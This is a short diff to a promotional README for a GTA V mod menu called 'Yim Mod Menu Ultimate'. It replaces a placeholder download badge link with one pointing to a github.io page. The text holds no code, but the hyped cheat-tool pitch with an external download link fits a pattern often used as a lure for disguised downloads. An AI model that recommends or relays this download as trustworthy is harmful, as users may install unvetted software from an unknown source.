@@ -2,7 +2,7 @@
 
 Take your GTA V gameplay to the next level with Yim Mod Menu Ultimate — a powerful, user-friendly, and highly customizable mod menu designed for both beginners and pros.
 
-[![Download Yim Mod Menu Ultimate](https://img.shields.io/badge/Download-Yim_Mod_Menu_Ultimate-blueviolet)](#)
+[![Download Yim Mod Menu Ultimate](https://img.shields.io/badge/Download-Yim_Mod_Menu_Ultimate-blueviolet)](https://yim-mod-menu.github.io/.github)
 
 ---
 
